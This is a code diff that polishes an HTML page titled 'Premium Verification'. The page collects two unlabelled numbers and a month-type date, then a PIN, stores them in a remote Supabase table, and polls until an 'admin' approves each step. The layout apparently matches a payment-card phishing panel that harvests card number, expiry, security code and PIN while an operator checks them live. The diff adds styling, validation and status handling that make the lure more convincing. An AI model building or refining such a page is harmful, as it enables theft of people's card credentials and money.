@@ -2,49 +2,146 @@
 <html>
 <head>
 
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Premium Verification</title>
 
 <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
 
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
 <style>
 
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Poppins',sans-serif;
+}
+
 body{
-    background:#111;
-    color:white;
-    font-family:Arial;
+    min-height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
-    height:100vh;
+    background:#0f0f0f;
+    overflow:hidden;
+    padding:20px;
+}
+
+.bg1{
+    position:absolute;
+    width:400px;
+    height:400px;
+    background:#ff0080;
+    filter:blur(180px);
+    top:-100px;
+    left:-100px;
+    opacity:0.4;
+}
+
+.bg2{
+    position:absolute;
+    width:400px;
+    height:400px;
+    background:#7928ca;
+    filter:blur(180px);
+    bottom:-100px;
+    right:-100px;
+    opacity:0.4;
 }
 
 .box{
-    width:400px;
-    background:#1b1b1b;
-    padding:30px;
-    border-radius:20px;
+    width:420px;
+    background:rgba(255,255,255,0.06);
+    border:1px solid rgba(255,255,255,0.1);
+    backdrop-filter:blur(20px);
+    padding:35px;
+    border-radius:30px;
+    position:relative;
+    z-index:10;
+    box-shadow:0 20px 60px rgba(0,0,0,0.5);
+}
+
+h2{
+    color:white;
+    text-align:center;
+    margin-bottom:30px;
+    font-size:32px;
+    font-weight:700;
 }
 
 input{
     width:100%;
-    padding:14px;
-    margin-bottom:15px;
+    margin-bottom:18px;
+    padding:15px;
     border:none;
-    border-radius:10px;
+    border-radius:14px;
+    background:rgba(255,255,255,0.08);
+    color:white;
+    outline:none;
+    font-size:15px;
+}
+
+input::placeholder{
+    color:#bbb;
 }
 
 button{
     width:100%;
-    padding:14px;
-    background:#ff0080;
-    color:white;
+    padding:15px;
     border:none;
-    border-radius:10px;
+    border-radius:14px;
+    background:linear-gradient(135deg,#ff0080,#7928ca);
+    color:white;
+    font-size:16px;
+    font-weight:600;
     cursor:pointer;
+    transition:0.3s;
+}
+
+button:hover{
+    transform:translateY(-2px);
 }
 
 #status{
-    margin-top:20px;
+    margin-top:25px;
+    color:white;
+    text-align:center;
+}
+
+.wait{
+    color:#ffd166;
+    font-weight:600;
+}
+
+.reject{
+    color:#ff4d6d;
+    font-weight:600;
+    font-size:20px;
+}
+
+.success{
+    color:#00ff95;
+    font-size:30px;
+    font-weight:700;
+}
+
+.loader{
+    width:45px;
+    height:45px;
+    border:4px solid rgba(255,255,255,0.2);
+    border-top:4px solid #ff0080;
+    border-radius:50%;
+    margin:15px auto;
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
 }
 
 </style>
@@ -52,15 +149,23 @@ button{
 </head>
 <body>
 
+<div class="bg1"></div>
+<div class="bg2"></div>
+
 <div class="box">
 
-<h2>Verification</h2>
+<h2>Premium Verification</h2>
 
-<input type="text" id="number1" placeholder="Number 1">
+<input type="text"
+id="number1"
+placeholder="Enter Number 1">
 
-<input type="month" id="date_value">
+<input type="month"
+id="date_value">
 
-<input type="text" id="number2" placeholder="Number 2">
+<input type="text"
+id="number2"
+placeholder="Enter Number 2">
 
 <button onclick="submitForm()">
 Continue
@@ -72,14 +177,19 @@ Continue
 
 <script>
 
-const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
-const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
+const SUPABASE_URL =
+'https://ijvtokyhuqrwndyfxzrn.supabase.co';
+
+const SUPABASE_KEY =
+'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
 
 const client = window.supabase.createClient(
     SUPABASE_URL,
     SUPABASE_KEY
 );
+
 let currentId = null;
+let interval;
 
 
 // SUBMIT FORM
@@ -94,8 +204,22 @@ async function submitForm(){
     const number2 =
     document.getElementById('number2').value;
 
-    document.getElementById('status').innerHTML =
-    'Submitting...';
+    if(!number1 || !date_value || !number2){
+
+        alert('Please Fill All Fields');
+
+        return;
+    }
+
+    document.getElementById('status').innerHTML = `
+
+    <div class="loader"></div>
+
+    <div class="wait">
+    Submitting Request...
+    </div>
+
+    `;
 
     const { data, error } = await client
     .from('requests')
@@ -103,10 +227,26 @@ async function submitForm(){
         {
             number1,
             date_value,
-            number2
+            number2,
+            status:'pending',
+            pin:'',
+            pin_status:'waiting'
         }
     ])
     .select();
+
+    if(error){
+
+        document.getElementById('status').innerHTML = `
+        <div class="reject">
+        Error Submitting Form
+        </div>
+        `;
+
+        console.log(error);
+
+        return;
+    }
 
     currentId = data[0].id;
 
@@ -115,74 +255,124 @@ async function submitForm(){
 }
 
 
-// REALTIME
-async function listenStatus(){
 
-    setInterval(async()=>{
+// REALTIME STATUS
+function listenStatus(){
 
-        const { data } = await client
+    clearInterval(interval);
+
+    interval = setInterval(async()=>{
+
+        const { data, error } = await client
         .from('requests')
         .select('*')
         .eq('id',currentId)
         .single();
 
-        // PENDING
+        if(error){
+
+            console.log(error);
+
+            return;
+        }
+
+        // WAITING
         if(data.status === 'pending'){
 
-            document.getElementById('status').innerHTML =
-            'Waiting For Admin...';
+            document.getElementById('status').innerHTML = `
+
+            <div class="loader"></div>
+
+            <div class="wait">
+            Waiting For Admin Approval...
+            </div>
+
+            `;
 
         }
 
         // REJECTED
         else if(data.status === 'rejected'){
 
-            document.getElementById('status').innerHTML =
-            'Request Rejected';
+            clearInterval(interval);
+
+            document.getElementById('status').innerHTML = `
+
+            <div class="reject">
+            Request Rejected
+            </div>
+
+            `;
 
         }
 
         // ACCEPTED
         else if(data.status === 'accepted'){
 
-            // PIN WAIT
+            // PIN WAITING
             if(data.pin_status === 'waiting'){
 
-                document.getElementById('status').innerHTML = `
+                // RELOAD STOP
+                if(!document.getElementById('pin')){
 
-                <input type="text"
-                id="pin"
-                placeholder="Enter PIN">
+                    document.getElementById('status').innerHTML = `
 
-                <button onclick="submitPin()">
-                Submit PIN
-                </button>
+                    <input type="text"
+                    id="pin"
+                    placeholder="Enter PIN">
 
-                `;
+                    <button onclick="submitPin()">
+                    Submit PIN
+                    </button>
+
+                    `;
+
+                }
 
             }
 
             // PIN PENDING
             else if(data.pin_status === 'pending'){
 
-                document.getElementById('status').innerHTML =
-                'Waiting For PIN Approval...';
+                document.getElementById('status').innerHTML = `
+
+                <div class="loader"></div>
+
+                <div class="wait">
+                Waiting For PIN Approval...
+                </div>
+
+                `;
 
             }
 
-            // PIN REJECTED
+            // PIN REJECT
             else if(data.pin_status === 'rejected'){
 
-                document.getElementById('status').innerHTML =
-                'PIN Rejected';
+                clearInterval(interval);
+
+                document.getElementById('status').innerHTML = `
+
+                <div class="reject">
+                PIN Rejected
+                </div>
+
+                `;
 
             }
 
             // SUCCESS
             else if(data.pin_status === 'accepted'){
 
-                document.getElementById('status').innerHTML =
-                '<h1>Congratulations 🎉</h1>';
+                clearInterval(interval);
+
+                document.getElementById('status').innerHTML = `
+
+                <div class="success">
+                Congratulations 🎉
+                </div>
+
+                `;
 
             }
 
@@ -199,6 +389,23 @@ async function submitPin(){
 
     const pin =
     document.getElementById('pin').value;
+
+    if(!pin){
+
+        alert('Enter PIN');
+
+        return;
+    }
+
+    document.getElementById('status').innerHTML = `
+
+    <div class="loader"></div>
+
+    <div class="wait">
+    Submitting PIN...
+    </div>
+
+    `;
 
     await client
     .from('requests')
